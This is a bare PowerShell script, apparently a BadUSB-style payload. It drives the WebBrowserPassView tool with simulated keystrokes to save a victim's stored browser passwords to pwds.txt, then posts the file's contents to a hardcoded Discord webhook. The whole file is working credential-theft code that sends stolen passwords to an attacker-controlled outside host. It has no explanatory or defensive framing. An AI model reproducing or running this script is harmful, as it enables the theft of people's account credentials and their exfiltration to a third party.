$wshell = New-Object -ComObject wscript.shell;
$wshell.AppActivate('WebBrowserPassView')
Sleep 1
$wshell.SendKeys("^{a}")
Sleep 1
$wshell.SendKeys("^{s}")
Sleep 1
$wshell.SendKeys("pwds.txt")
Sleep 1
$wshell.SendKeys("~")

$PassContent = Get-Content pwds.txt

$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"

$msg = @{
    content = $PassContent
} | ConvertTo-Json

Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
